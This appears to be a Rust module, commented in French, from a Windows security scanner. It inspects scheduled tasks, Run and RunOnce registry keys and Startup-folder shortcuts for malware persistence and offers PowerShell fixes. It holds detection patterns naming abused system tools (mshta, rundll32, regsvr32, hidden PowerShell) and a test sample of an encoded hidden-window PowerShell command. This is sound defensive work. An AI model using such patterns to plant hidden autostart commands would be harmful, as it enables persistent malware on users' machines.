//! Ce qui se lance tout seul sous Windows : tâches planifiées, clés Run et RunOnce, dossiers Démarrage.

use super::*;
use crate::commande::decouper_commande;

/// Pourquoi ce programme lancé automatiquement (tâche planifiée, clé Run, dossier Démarrage) ressemble à un
/// malware, ou `None`. Seules des formes précises sont retenues : les programmes installés normalement n'y tombent pas.
pub(super) fn lancement_suspect(exe: &str, args: &str) -> Option<&'static str> {
    let exe = exe.trim().trim_matches('"').to_lowercase().replace('/', "\\");
    let args = args.to_lowercase();
    let tout = format!("{exe} {args}");
    let temporaire = |t: &str| {
        ["\\appdata\\local\\temp\\", "%temp%", "%tmp%", "\\windows\\temp\\"]
            .iter()
            .any(|d| t.contains(d))
    };
    let public = |t: &str| {
        ["\\users\\public\\", "\\$recycle.bin\\", "%public%"]
            .iter()
            .any(|d| t.contains(d))
    };
    let programme = exe.rsplit('\\').next().unwrap_or(&exe).trim_end_matches(".exe");
    if temporaire(&exe) {
        return Some(tr!(
            "programme lancé depuis un dossier temporaire",
            "program started from a temporary folder"
        ));
    }
    if public(&exe) {
        return Some(tr!(
            "programme rangé dans le dossier Public ou la corbeille",
            "program stored in the Public folder or the recycle bin"
        ));
    }
    // PowerShell caché, mshta, regsvr32, rundll32, certutil, bitsadmin détournés : le même jugement que pour les
    // programmes en marche.
    if let Some(motif) = crate::machine::chasse::detournement(programme, &args) {
        return Some(motif.raison);
    }
    // Interpréteurs et outils système qui lancent un script ou une bibliothèque rangés dans un dossier temporaire ou public.
    let relais = [
        "wscript",
        "cscript",
        "mshta",
        "rundll32",
        "regsvr32",
        "cmd",
        "powershell",
        "pwsh",
    ];
    if relais.contains(&programme) && (temporaire(&tout) || public(&tout)) {
        return Some(tr!(
            "script ou bibliothèque lancé depuis un dossier temporaire ou public",
            "script or library started from a temporary or public folder"
        ));
    }
    if ["wscript", "cscript"].contains(&programme) && args.contains("\\appdata\\") {
        return Some(tr!(
            "script caché dans les données d'application, lancé automatiquement",
            "script hidden in application data, started automatically"
        ));
    }
    None
}

/// Les tâches planifiées hors \Microsoft\, lues par PowerShell en secours du planificateur (`planificateur::taches`).
const TACHES: &str = "try { Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' -and $_.TaskPath -notlike '\\Microsoft\\*' } | ForEach-Object { $t = $_; \
         $t.Actions | Where-Object { $_.Execute } | ForEach-Object { \"TCH|$($t.TaskPath)|$($t.TaskName)|$($_.Execute)|$($_.Arguments)\" } }; 'TCH_FIN' } catch {}";

/// Les dossiers Démarrage par PowerShell, en secours d'un raccourci que la lecture native ne comprend pas. Un dossier
/// qui n'existe pas (profil neuf, dossier supprimé) donne un chemin vide, et `Get-ChildItem ''` lit le dossier
/// courant : lancé depuis la clé, chacun de ses programmes passait pour un démarrage suspect. D'où les chemins vides
/// écartés. `-Force` : les fichiers cachés, que la lecture native voit, ne doivent pas disparaître au secours.
const DEMARRAGE: &str = "try { $w = New-Object -ComObject WScript.Shell; foreach ($d in [Environment]::GetFolderPath('Startup'), [Environment]::GetFolderPath('CommonStartup') | Where-Object { $_ }) { \
         Get-ChildItem -LiteralPath $d -File -Force -ErrorAction SilentlyContinue | Where-Object Name -ne 'desktop.ini' | ForEach-Object { \
         $cible = if ($_.Extension -eq '.lnk') { $r = $w.CreateShortcut($_.FullName); '\"' + $r.TargetPath + '\" ' + $r.Arguments } else { '\"' + $_.FullName + '\"' }; \
         \"DEM|$($_.FullName)|$cible\" } }; 'DEM_FIN' } catch {}";

/// Les clés Run et RunOnce de la lecture, sous le nom que PowerShell leur donne (la correction le reprend tel quel).
const CLES_RUN: [&str; 5] = [
    r"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    r"HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    r"HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    r"HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    r"HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
];

/// Les variables d'environnement d'un texte (« %APPDATA%\x.vbs ») remplacées comme Windows les remplace ; une
/// variable inconnue reste telle quelle.
fn developper(texte: &str, variable: impl Fn(&str) -> Option<String>) -> String {
    let mut sortie = String::new();
    let mut reste = texte;
    while let Some(debut) = reste.find('%') {
        sortie.push_str(&reste[..debut]);
        let apres = &reste[debut + 1..];
        if let Some(fin) = apres.find('%')
            && fin > 0
            && let Some(v) = variable(&apres[..fin])
        {
            sortie.push_str(&v);
            reste = &apres[fin + 1..];
        } else {
            sortie.push('%');
            reste = apres;
        }
    }
    sortie.push_str(reste);
    sortie
}

/// Une valeur du registre en texte, comme Get-ItemProperty la rend : REG_EXPAND_SZ développée (sinon
/// « %APPDATA%\… » échapperait au jugement), plusieurs chaînes jointes par une espace, nombres en décimal.
fn valeur_texte(valeur: &winreg::RegValue) -> String {
    use winreg::enums::RegType::{REG_DWORD, REG_EXPAND_SZ, REG_MULTI_SZ, REG_QWORD, REG_SZ};
    use winreg::types::FromRegValue;
    // Une chaîne que winreg refuse (UTF-16 mal formé) est lue avec pertes plutôt que rendue vide : une valeur Run
    // vide passerait pour saine.
    let texte = || String::from_reg_value(valeur).unwrap_or_else(|_| utf16_zero(&valeur.bytes));
    match valeur.vtype {
        REG_SZ | REG_MULTI_SZ => texte().replace('\n', " "),
        REG_EXPAND_SZ => developper(&texte(), |n| std::env::var(n).ok()),
        REG_DWORD => u32::from_reg_value(valeur).map(|n| n.to_string()).unwrap_or_default(),
        REG_QWORD => u64::from_reg_value(valeur).map(|n| n.to_string()).unwrap_or_default(),
        _ => String::new(),
    }
}

/// Une valeur d'une clé Run ou RunOnce.
pub(crate) struct ValeurRun {
    /// Le nom PowerShell de la clé (`CLES_RUN`).
    pub(crate) cle: &'static str,
    /// Vide pour la valeur par défaut ; lu avec pertes (U+FFFD) s'il n'est pas de l'Unicode valide.
    pub(crate) nom: String,
    /// Le nom exact, mot par mot, quand il n'est pas de l'Unicode valide (demi-caractère de substitution isolé, que
    /// RegSetValueExW accepte) : la correction doit viser ce nom-là, pas sa version lue avec pertes.
    mots: Option<Vec<u16>>,
    pub(crate) valeur: String,
}

/// Les valeurs des clés Run et RunOnce, lues par winreg, et les clés qui n'ont pas pu être lues en entier. Toutes les
/// valeurs comptent : le filtre « PS* » du script n'écartait que les propriétés ajoutées par PowerShell (PSPath…),
/// mais cachait aussi une valeur nommée « PSUpdate ». Les noms sont lus en UTF-16 brut : la conversion en texte de
/// winreg refusait un nom mal formé, et la valeur, que Windows lance quand même, était sautée. La seule lecture des
/// clés Run de Vanguard : « Mon ordinateur est-il contrôlé ? » et « Logiciels espions » en avaient chacun une copie, qui
/// jetait sans rien dire les valeurs que winreg ne rendait pas et ne lisait pas toutes les clés.
pub(crate) fn lignes_run() -> (Vec<ValeurRun>, Vec<&'static str>) {
    use std::os::windows::ffi::OsStrExt;
    use winreg::RegKey;
    use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW64_64KEY};
    let mut lignes = Vec::new();
    let mut non_lues = Vec::new();
    for nom_cle in CLES_RUN {
        let Some((ruche, chemin)) = nom_cle.split_once(r":\") else {
            continue;
        };
        let racine = RegKey::predef(if ruche == "HKCU" {
            HKEY_CURRENT_USER
        } else {
            HKEY_LOCAL_MACHINE
        });
        // La vue 64 bits, même si Vanguard était un jour compilé en 32 bits : sinon la clé serait redirigée vers
        // WOW6432Node et les programmes 64 bits manqueraient au bilan.
        // Une clé absente (RunOnce l'est souvent) n'a rien à lancer ; une clé refusée cache peut-être tout.
        let cle = match racine.open_subkey_with_flags(chemin, KEY_READ | KEY_WOW64_64KEY) {
            Ok(cle) => cle,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(_) => {
                non_lues.push(nom_cle);
                continue;
            }
        };
        for entree in cle.enum_values_os_string() {
            let Ok((nom, valeur)) = entree else {
                // Une valeur que le registre ne rend pas : la clé n'est pas lue en entier, rien ne la dit saine.
                if !non_lues.contains(&nom_cle) {
                    non_lues.push(nom_cle);
                }
                continue;
            };
            let mots = nom.to_str().is_none().then(|| nom.encode_wide().collect());
            lignes.push(ValeurRun {
                cle: nom_cle,
                nom: nom.to_string_lossy().into_owned(),
                mots,
                valeur: valeur_texte(&valeur),
            });
        }
    }
    (lignes, non_lues)
}

/// La correction d'une valeur Run : par le registre de .NET, qui vise le nom exact. Le -Name de Remove-ItemProperty
/// accepte des jokers, et le nom est choisi par le programme qui se fait relancer : « [svc] » y visait une valeur
/// « s », « v » ou « c » (la correction ratait), « * » retirait toutes les valeurs de la clé. Un nom mal formé est
/// réécrit mot par mot : sa version lue avec pertes ne désignerait aucune valeur.
fn retrait_run(v: &ValeurRun) -> Option<String> {
    let ps_texte = crate::commande::ps_texte;
    let (ruche, chemin) = v.cle.split_once(r":\")?;
    let ruche = if ruche == "HKCU" { "CurrentUser" } else { "LocalMachine" };
    let nom = match &v.mots {
        Some(mots) => {
            let codes: Vec<String> = mots.iter().map(|m| format!("0x{m:04X}")).collect();
            format!("(-join [char[]]({}))", codes.join(","))
        }
        None => format!("'{}'", ps_texte(&v.nom)),
    };
    // La vue 64 bits, comme la lecture : sinon une fenêtre PowerShell 32 bits viserait WOW6432Node.
    Some(format!(
        "$k = [Microsoft.Win32.RegistryKey]::OpenBaseKey('{ruche}', 'Registry64').OpenSubKey('{}', $true); \
         $k.DeleteValue({nom}); $k.Close()",
        ps_texte(chemin)
    ))
}

/// Le texte d'un tampon UTF-16 (petit-boutiste) jusqu'au premier zéro.
fn utf16_zero(octets: &[u8]) -> String {
    let mots: Vec<u16> = octets
        .as_chunks::<2>()
        .0
        .iter()
        .map(|&m| u16::from_le_bytes(m))
        .take_while(|&m| m != 0)
        .collect();
    String::from_utf16_lossy(&mots)
}

/// Le texte d'un tampon ANSI jusqu'au premier zéro, lu en Latin-1 (les chemins des raccourcis récents ont aussi
/// leur version UTF-16, préférée quand elle existe).
fn ansi_zero(octets: &[u8]) -> String {
    octets.iter().take_while(|&&o| o != 0).map(|&o| char::from(o)).collect()
}

/// Le chemin de la cible dans le bloc LinkInfo d'un raccourci : chemin local (ou nom réseau) suivi du suffixe commun.
fn chemin_infos(infos: &[u8]) -> Option<String> {
    let u32_a = |p: usize| octets_u32(infos, p).and_then(|n| usize::try_from(n).ok());
    let a_partir = |p: usize| infos.get(p..);
    let entete = u32_a(4)?;
    let drapeaux = u32_a(8)?;
    let unicode = |champ: usize| (entete >= 0x24).then(|| u32_a(champ)).flatten().filter(|&o| o != 0);
    let base = if drapeaux & 0x1 != 0 {
        match unicode(0x1C) {
            Some(o) => utf16_zero(a_partir(o)?),
            None => ansi_zero(a_partir(u32_a(0x10)?)?),
        }
    } else if drapeaux & 0x2 != 0 {
        let reseau = a_partir(u32_a(0x14)?)?;
        let nom = usize::try_from(octets_u32(reseau, 8)?).ok()?;
        let nom_unicode = (nom > 0x14).then(|| octets_u32(reseau, 0x14)).flatten();
        let nom = match nom_unicode.and_then(|o| usize::try_from(o).ok()) {
            Some(o) => utf16_zero(reseau.get(o..)?),
            None => ansi_zero(reseau.get(nom..)?),
        };
        nom + "\\"
    } else {
        return None;
    };
    let suffixe = match unicode(0x20) {
        Some(o) => utf16_zero(a_partir(o)?),
        None => ansi_zero(a_partir(u32_a(0x18)?)?),
    };
    let cible = if suffixe.is_empty() || base.ends_with('\\') {
        base + &suffixe
    } else {
        format!("{base}\\{suffixe}")
    };
    (!cible.is_empty()).then_some(cible)
}

fn octets_u32(octets: &[u8], p: usize) -> Option<u32> {
    let b = octets.get(p..p.checked_add(4)?)?;
    Some(u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
}

fn octets_u16(octets: &[u8], p: usize) -> Option<u16> {
    let b = octets.get(p..p.checked_add(2)?)?;
    Some(u16::from_le_bytes([b[0], b[1]]))
}

/// La cible et les arguments d'un raccourci (.lnk), lus dans le fichier (format MS-SHLLINK) sans COM. `None` quand
/// la cible ne s'y lit pas, ou quand le fichier se contredit : l'appelant reprend alors PowerShell, pour qu'aucun
/// raccourci ne compte comme sain sans avoir été lu. Ce que Windows lance, c'est la liste d'éléments du shell
/// (LinkTargetIDList) ; LinkInfo et le bloc des variables ne font que la décrire, et un raccourci forgé peut y
/// afficher un programme sain devant une liste qui en lance un autre, au même nom dans un autre dossier : le chemin
/// complet de la liste doit être celui de la cible retenue.
fn cible_raccourci(octets: &[u8]) -> Option<(String, String)> {
    // L'identifiant de classe des raccourcis, 00021401-0000-0000-C000-000000000046, tel qu'il est écrit dans le fichier.
    const CLASSE: [u8; 16] = [1, 0x14, 2, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46];
    const LISTE: u32 = 0x1;
    const INFOS: u32 = 0x2;
    const UNICODE: u32 = 0x80;
    /// HasExpString : sans ce drapeau, Windows ignore le bloc des variables d'environnement.
    const VARIABLES_LUES: u32 = 0x200;
    const VARIABLES: u32 = 0xA000_0001;
    let tranche = |p: usize, n: usize| octets.get(p..p.checked_add(n)?);
    if octets_u32(octets, 0)? != 0x4C || tranche(4, 16)? != CLASSE {
        return None;
    }
    let drapeaux = octets_u32(octets, 0x14)?;
    let mut p = 0x4C;
    let mut cible_liste = None;
    if drapeaux & LISTE != 0 {
        let taille = usize::from(octets_u16(octets, p)?);
        cible_liste = Some(chemin_liste(tranche(p + 2, taille)?)?);
        p += 2 + taille;
    }
    let mut cible_infos = None;
    if drapeaux & INFOS != 0 {
        let infos = tranche(p, usize::try_from(octets_u32(octets, p)?).ok()?)?;
        cible_infos = chemin_infos(infos);
        p += infos.len();
    }
    // Nom, chemin relatif, dossier de travail, arguments, icône : chacun présent selon son drapeau.
    let mut arguments = String::new();
    for drapeau in [0x4, 0x8, 0x10, 0x20, 0x40] {
        if drapeaux & drapeau == 0 {
            continue;
        }
        let n = usize::from(octets_u16(octets, p)?);
        let taille = if drapeaux & UNICODE != 0 { n * 2 } else { n };
        let brut = tranche(p + 2, taille)?;
        if drapeau == 0x20 {
            arguments = if drapeaux & UNICODE != 0 {
                utf16_zero(brut)
            } else {
                ansi_zero(brut)
            };
        }
        p += 2 + taille;
    }
    // Les blocs de la fin : celui des variables d'environnement donne la cible que Windows développe et préfère,
    // mais seulement quand le drapeau HasExpString le valide.
    let mut cible_variables = None;
    while let Some(taille) = octets_u32(octets, p).and_then(|n| usize::try_from(n).ok())
        && taille >= 8
    {
        let bloc = tranche(p, taille)?;
        if drapeaux & VARIABLES_LUES != 0 && octets_u32(bloc, 4) == Some(VARIABLES) && bloc.len() >= 8 + 260 + 520 {
            let texte = match utf16_zero(&bloc[268..788]) {
                t if t.is_empty() => ansi_zero(&bloc[8..268]),
                t => t,
            };
            if !texte.is_empty() {
                cible_variables = Some(developper(&texte, |n| std::env::var(n).ok()));
            }
        }
        p += taille;
    }
    let cible = cible_variables.or(cible_infos).or_else(|| cible_liste.clone())?;
    if let Some(liste) = cible_liste
        && !memes_chemins(&cible, &liste)
    {
        return None;
    }
    Some((cible, arguments))
}

/// Deux chemins Windows désignent-ils le même fichier : mêmes lettres sans tenir compte de la casse ni du sens des
/// barres, ni d'une barre finale.
fn memes_chemins(a: &str, b: &str) -> bool {
    let propre = |c: &str| c.replace('/', "\\").trim_end_matches('\\').to_string();
    propre(a).eq_ignore_ascii_case(&propre(b))
}

/// Le chemin complet d'une liste d'éléments du shell, ce que Windows lance : l'élément racine (Poste de travail,
/// 0x1F) est sauté, l'élément du lecteur (0x2F) donne « C:\ », chaque élément de fichier ou de dossier (0x30 à 0x3F)
/// ajoute son nom. `None` pour tout autre genre d'élément (réseau, panneau de configuration, dossier spécial) ou sans
/// lecteur : la cible ne se vérifie pas ici, PowerShell la résoudra.
fn chemin_liste(liste: &[u8]) -> Option<String> {
    let mut chemin = String::new();
    let mut p = 0;
    loop {
        let taille = usize::from(octets_u16(liste, p)?);
        if taille == 0 {
            break;
        }
        let element = liste.get(p + 2..p.checked_add(taille)?)?;
        p += taille;
        match *element.first()? {
            0x1F => {}
            0x2F => chemin = ansi_zero(element.get(1..)?),
            0x30..=0x3F => {
                let nom = nom_element(element)?;
                if !chemin.ends_with('\\') {
                    chemin.push('\\');
                }
                chemin.push_str(&nom);
            }
            _ => return None,
        }
    }
    (chemin.len() > 3 && chemin.get(1..3) == Some(":\\")).then_some(chemin)
}

/// Le nom d'un élément de fichier ou de dossier (types 0x30 à 0x3F) d'une liste d'éléments du shell : son nom long
/// UTF-16 dans l'extension BEEF0004 quand elle existe, sinon son nom court.
fn nom_element(element: &[u8]) -> Option<String> {
    let genre = *element.first()?;
    // En-tête d'un élément de fichier : type, octet inconnu, taille (4), date (4), attributs (2), puis le nom court,
    // en UTF-16 quand le type en porte le drapeau.
    let apres = element.get(12..)?;
    let nom_court = if genre & 0x04 != 0 {
        utf16_zero(apres)
    } else {
        ansi_zero(apres)
    };
    // L'extension BEEF0004 porte le nom long ; sa place dépend de la version du bloc (XP 3, Vista 7, Windows 7 8,
    // Windows 8 et suivants 9).
    let nom_long = apres
        .windows(4)
        .position(|w| w == [0x04, 0x00, 0xEF, 0xBE])
        .and_then(|signature| {
            let bloc = apres.get(signature.checked_sub(4)?..)?;
            let nom = match octets_u16(bloc, 2)? {
                3 => 20,
                7 => 38,
                8 => 42,
                9 => 46,
                _ => return None,
            };
            Some(utf16_zero(bloc.get(nom..)?))
        })
        .filter(|n| !n.is_empty());
    nom_long.or_else(|| (!nom_court.is_empty()).then_some(nom_court))
}

/// Les dossiers Démarrage de la personne puis de tous, comme [Environment]::GetFolderPath les donne. Un chemin vide
/// ou relatif est écarté : il lirait le dossier courant (la clé, avec ses programmes).
fn dossiers_demarrage() -> Vec<std::path::PathBuf> {
    use winreg::RegKey;
    use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
    const DOSSIERS: &str = r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders";
    let lire = |ruche, nom: &str, defaut: &str| {
        RegKey::predef(ruche)
            .open_subkey(DOSSIERS)
            .and_then(|k| k.get_raw_value(nom))
            .map(|v| valeur_texte(&v))
            .ok()
            .filter(|d| !d.is_empty())
            .unwrap_or_else(|| developper(defaut, |n| std::env::var(n).ok()))
    };
    [
        lire(
            HKEY_CURRENT_USER,
            "Startup",
            r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup",
        ),
        lire(
            HKEY_LOCAL_MACHINE,
            "Common Startup",
            r"%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup",
        ),
    ]
    .into_iter()
    .map(std::path::PathBuf::from)
    .filter(|d| d.is_absolute())
    .collect()
}

/// La section DEM : `None` si un raccourci ne se lit pas sans COM, ou si un dossier existant ne se lit pas (PowerShell
/// reprend alors). Les fichiers cachés comptent aussi (le secours les voit de même, par -Force).
fn lignes_demarrage() -> Option<Vec<String>> {
    use std::io::Read;
    let mut lignes = Vec::new();
    for dossier in dossiers_demarrage() {
        let entrees = match std::fs::read_dir(&dossier) {
            Ok(entrees) => entrees,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(_) => return None,
        };
        for entree in entrees {
            let entree = entree.ok()?;
            let chemin = entree.path();
            if !chemin.is_file() || entree.file_name().eq_ignore_ascii_case("desktop.ini") {
                continue;
            }
            let plein = chemin.to_string_lossy();
            let cible = if chemin.extension().is_some_and(|x| x.eq_ignore_ascii_case("lnk")) {
                // Un raccourci tient en quelques kilo-octets : lu au plus sur un mégaoctet.
                let mut octets = Vec::new();
                std::fs::File::open(&chemin)
                    .ok()?
                    .take(1 << 20)
                    .read_to_end(&mut octets)
                    .ok()?;
                let (cible, arguments) = cible_raccourci(&octets)?;
                format!("\"{cible}\" {arguments}")
            } else {
                format!("\"{plein}\"")
            };
            lignes.push(format!("{plein}|{cible}"));
        }
    }
    Some(lignes)
}

/// Ce qui se lance tout seul hors de Windows : tâches planifiées (hors \Microsoft\), clés Run et RunOnce,
/// dossiers Démarrage. Tout est lu sans PowerShell (le planificateur par COM) ; lui ne sert plus qu'en secours :
/// planificateur muet, ou raccourci du dossier Démarrage qui ne se lit pas autrement.
pub(super) fn persistance() -> Vec<Constat> {
    let (run, run_non_lues) = lignes_run();
    let demarrage = lignes_demarrage();
    let taches_com = super::planificateur::taches();
    let script = match (taches_com.is_some(), demarrage.is_some()) {
        (true, true) => None,
        (true, false) => Some(DEMARRAGE.to_string()),
        (false, true) => Some(TACHES.to_string()),
        (false, false) => Some(format!("{TACHES}; {DEMARRAGE}")),
    };
    let sortie = script.and_then(|s| ps(&s));
    let taches: Option<Vec<&str>> = match &taches_com {
        Some(lignes) => Some(lignes.iter().map(String::as_str).collect()),
        None => section(sortie.as_deref(), "TCH"),
    };
    let demarrage: Option<Vec<&str>> = match &demarrage {
        Some(lignes) => Some(lignes.iter().map(String::as_str).collect()),
        None => section(sortie.as_deref(), "DEM"),
    };
    // Ce qui n'a pas été lu n'est ni sain ni vide : le reste est jugé, mais sans « aucun suspect ».
    let mut non_lus: Vec<String> = Vec::new();
    if taches.is_none() {
        non_lus.push(
            tr!(
                "tâches planifiées non lues (PowerShell indisponible ou bloqué)",
                "scheduled tasks not read (PowerShell unavailable or blocked)"
            )
            .to_string(),
        );
    }
    if demarrage.is_none() {
        non_lus.push(
            tr!(
                "dossiers Démarrage non lus (raccourci illisible, PowerShell indisponible ou bloqué)",
                "Startup folders not read (unreadable shortcut, PowerShell unavailable or blocked)"
            )
            .to_string(),
        );
    }
    if !run_non_lues.is_empty() {
        let cles = run_non_lues.join(", ");
        non_lus.push(trf!(
            "clés de démarrage non lues en entier : {cles}",
            "startup keys not fully read: {cles}"
        ));
    }
    let constats = juger_persistance(&taches.unwrap_or_default(), &run, &demarrage.unwrap_or_default());
    if non_lus.is_empty() {
        return constats;
    }
    let mut constats: Vec<Constat> = constats.into_iter().filter(|c| c.probleme.is_some()).collect();
    constats.extend(non_lus.iter().map(|raison| impossible("Persistance", raison)));
    constats
}

/// PowerShell lancé en fenêtre cachée (« -w hidden », « -WindowStyle Hidden ») sans autre signe : dit en information
/// seulement. Des outils légitimes le font (mises à jour, outils d'entreprise), mais c'est aussi un réflexe de logiciel
/// malveillant : la personne regarde si elle le reconnaît.
fn fenetre_cachee(exe: &str, args: &str) -> bool {
    let exe = exe.trim().trim_matches('"').to_lowercase().replace('/', "\\");
    let programme = exe.rsplit('\\').next().unwrap_or(&exe).trim_end_matches(".exe");
    if !matches!(programme, "powershell" | "pwsh") {
        return false;
    }
    let jetons: Vec<String> = args
        .to_lowercase()
        .split_whitespace()
        .map(|j| j.trim_matches('"').replacen('/', "-", 1))
        .collect();
    jetons
        .windows(2)
        .any(|p| p[0].len() >= 2 && "-windowstyle".starts_with(p[0].as_str()) && (p[1] == "hidden" || p[1] == "h"))
}

/// Le constat d'information d'un lancement automatique en fenêtre cachée.
fn info_fenetre_cachee(ou: &str, commande: &str) -> Constat {
    alerte(
        "Persistance",
        Niveau::Info,
        trf!(
            "{ou} lance PowerShell en fenêtre cachée ({commande}) : des outils légitimes le font, mais c'est aussi un réflexe de logiciel malveillant. Vérifiez que vous le reconnaissez.",
            "{ou} starts PowerShell in a hidden window ({commande}): legitimate tools do this, but so does malware. Check that you recognize it."
        ),
    )
}

fn juger_persistance(taches: &[&str], run: &[ValeurRun], demarrage: &[&str]) -> Vec<Constat> {
    use crate::modele::Objet;
    let ps_texte = crate::commande::ps_texte;
    // Noms, chemins et commandes sont choisis par le programme qui se fait relancer : les corrections visent le vrai
    // nom, les messages le montrent rendu inoffensif.
    let montre = crate::ui::affichable;
    let mut constats = Vec::new();
    for t in taches {
        let c: Vec<&str> = t.trim().splitn(4, '|').collect();
        let [chemin_brut, nom_brut, exe_brut, args_brut] = c[..] else {
            continue;
        };
        // L'objet : la tâche et ce qu'elle lance, tels que Windows les donne (sans casse) ; une autre commande sous le
        // même nom est un autre objet, jamais tu par un choix d'avant.
        let objet = Objet::de(
            "tache",
            &format!("{chemin_brut}{nom_brut}={exe_brut} {args_brut}").to_lowercase(),
        );
        if let Some(raison) = lancement_suspect(exe_brut, args_brut) {
            let (chemin, nom, exe, args) = (
                montre(chemin_brut),
                montre(nom_brut),
                montre(exe_brut),
                montre(args_brut),
            );
            constats.push(
                alerte(
                    "Persistance",
                    Niveau::Eleve,
                    trf!(
                        "Tâche planifiée suspecte « {chemin}{nom} » : {raison} ({exe} {args}).",
                        "Suspicious scheduled task “{chemin}{nom}”: {raison} ({exe} {args})."
                    ),
                )
                .avec_objet(objet)
                .corriger(
                    trf!(
                        "Désactiver la tâche « {nom} » (réactivable)",
                        "Disable the “{nom}” task (can be turned back on)"
                    ),
                    &[&format!(
                        "Disable-ScheduledTask -TaskPath '{}' -TaskName '{}' | Out-Null",
                        ps_texte(chemin_brut),
                        ps_texte(nom_brut)
                    )],
                ),
            );
        } else if fenetre_cachee(exe_brut, args_brut) {
            let lieu = trf!(
                "La tâche planifiée « {}{} »",
                "Scheduled task “{}{}”",
                montre(chemin_brut),
                montre(nom_brut)
            );
            constats.push(info_fenetre_cachee(&lieu, &montre(&format!("{exe_brut} {args_brut}"))).avec_objet(objet));
        }
    }
    for r in run {
        let (exe, args) = decouper_commande(&r.valeur);
        let objet = Objet::de("run", &format!("{}\\{}={}", r.cle, r.nom, r.valeur).to_lowercase());
        if let Some(raison) = lancement_suspect(&exe, &args) {
            let nom = if r.nom.is_empty() { "(default)" } else { &r.nom };
            let (cle, nom, valeur) = (montre(r.cle), montre(nom), montre(&r.valeur));
            let constat = alerte(
                "Persistance",
                Niveau::Eleve,
                trf!(
                    "Lancement automatique suspect « {nom} » ({cle}) : {raison} ({valeur}).",
                    "Suspicious autostart “{nom}” ({cle}): {raison} ({valeur})."
                ),
            )
            .avec_objet(objet);
            constats.push(match retrait_run(r) {
                Some(retrait) => constat.corriger(
                    trf!("Retirer « {nom} » du démarrage", "Remove “{nom}” from startup"),
                    &[retrait],
                ),
                None => constat,
            });
        } else if fenetre_cachee(&exe, &args) {
            let nom = if r.nom.is_empty() { "(default)" } else { &r.nom };
            let lieu = trf!(
                "Le lancement automatique « {} » ({})",
                "Autostart “{}” ({})",
                montre(nom),
                montre(r.cle)
            );
            constats.push(info_fenetre_cachee(&lieu, &montre(&r.valeur)).avec_objet(objet));
        }
    }
    for d in demarrage {
        let Some((fichier_brut, cible_brute)) = d.trim().split_once('|') else {
            continue;
        };
        let (exe, args) = decouper_commande(cible_brute);
        let objet = Objet::de(
            "demarrage",
            &format!(
                "{}={}",
                crate::modele::id::chemin(fichier_brut),
                cible_brute.to_lowercase()
            ),
        );
        if let Some(raison) = lancement_suspect(&exe, &args) {
            let (fichier, cible) = (montre(fichier_brut), montre(cible_brute));
            constats.push(
                alerte(
                    "Persistance",
                    Niveau::Eleve,
                    trf!(
                        "Raccourci suspect dans le dossier Démarrage « {fichier} » : {raison} ({cible}).",
                        "Suspicious shortcut in the Startup folder “{fichier}”: {raison} ({cible})."
                    ),
                )
                .avec_objet(objet)
                .corriger(
                    trf!("Supprimer « {fichier} »", "Delete “{fichier}”"),
                    &[&format!("Remove-Item -LiteralPath '{}'", ps_texte(fichier_brut))],
                ),
            );
        } else if fenetre_cachee(&exe, &args) {
            let lieu = trf!(
                "Le raccourci du dossier Démarrage « {} »",
                "Startup folder shortcut “{}”",
                montre(fichier_brut)
            );
            constats.push(info_fenetre_cachee(&lieu, &montre(cible_brute)).avec_objet(objet));
        }
    }
    if constats.is_empty() {
        constats.push(ok(
            "Persistance",
            trf!(
                "{} tâche(s) planifiée(s) hors Microsoft et {} programme(s) au démarrage, aucun suspect.",
                "{} non-Microsoft scheduled task(s) and {} startup program(s), none suspicious.",
                taches.len(),
                run.len() + demarrage.len()
            ),
        ));
    }
    constats
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn powershell_en_fenetre_cachee_dit_en_information() {
        assert!(fenetre_cachee("powershell.exe", "-w hidden -File C:\\Outils\\maj.ps1"));
        assert!(fenetre_cachee(
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "-WindowStyle Hidden -NoProfile"
        ));
        assert!(fenetre_cachee("pwsh", "/win h -c x"));
        assert!(!fenetre_cachee("powershell.exe", "-NoProfile -File maj.ps1"));
        assert!(!fenetre_cachee("notepad.exe", "-w hidden"));
        // Dans le bilan : une information, pas une alerte, et pas de correction proposée.
        let run = [ValeurRun {
            cle: "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            nom: "OutilMaj".into(),
            mots: None,
            valeur: "powershell.exe -w hidden -File C:\\Outils\\maj.ps1".into(),
        }];
        let c = juger_persistance(&[], &run, &[]);
        let info: Vec<&Constat> = c.iter().filter(|c| c.probleme == Some(Niveau::Info)).collect();
        assert_eq!(info.len(), 1);
        assert!(info[0].message.contains("fenêtre cachée") || info[0].message.contains("hidden window"));
        // Encodée en base64, la même commande reste une alerte élevée.
        let run = [ValeurRun {
            cle: run[0].cle,
            nom: "OutilMaj".into(),
            mots: None,
            valeur: "powershell.exe -w hidden -enc SQBFAFgA".into(),
        }];
        assert!(
            juger_persistance(&[], &run, &[])
                .iter()
                .any(|c| c.probleme == Some(Niveau::Eleve))
        );
    }

    #[test]
    fn dossier_demarrage_absent_ne_lit_pas_le_dossier_courant() {
        // Un chemin vide lirait le dossier courant (constaté dans un compte neuf, le 19 octobre).
        assert!(DEMARRAGE.contains("[Environment]::GetFolderPath('CommonStartup') | Where-Object { $_ })"));
        assert!(DEMARRAGE.contains("Get-ChildItem -LiteralPath $d -File"));
        // Les fichiers cachés, que la lecture native voit, comptent aussi au secours.
        assert!(DEMARRAGE.contains("-File -Force"));
        assert!(!DEMARRAGE.contains("Get-ChildItem $d"));
    }

